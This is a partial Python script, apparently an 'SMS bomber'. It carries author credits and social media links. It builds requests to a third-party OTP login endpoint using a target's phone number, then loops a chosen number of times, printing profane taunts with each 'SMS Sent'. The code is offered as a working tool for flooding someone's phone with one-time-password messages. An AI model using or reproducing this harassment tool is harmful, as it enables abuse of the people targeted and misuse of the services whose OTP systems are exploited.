#colour
#The Tool Admin : NWOMBU DAVID CHINEDU
...
dtls=(red+"\t\t Created By: NWOMBU DAVID ")

note=(cyan+"\n\n ============================= \n Author/Modifier : NWOMBU DAVID\n =============================\n Facebook : www.facebook.com/profile.php?id=100063716716333
.0.2\n=============================\n Creator : NWOMBU DAVID       \n=============================\n GITHUB : https://github.com/DavidKumar45\n=============================\n FB Page: www.facebook.com/Robert Micheal.0.2")
...
url3 = "https://stage.bioscopelive.com/en/login/send-otp?phone=234"+number+"&operator=bd-otp"
...
data6 = '{"phone":"'+number+'","country_code":"+234","fcm_token":null}'
...
for i in range (amount):
        ...
        print(str(i+1)+green+'. ➙ successfully SMS Sent thank me later, abeg send me recharge card to ... oh you wanna bomb me... fuck you 🚀 ✅🇧🇩')
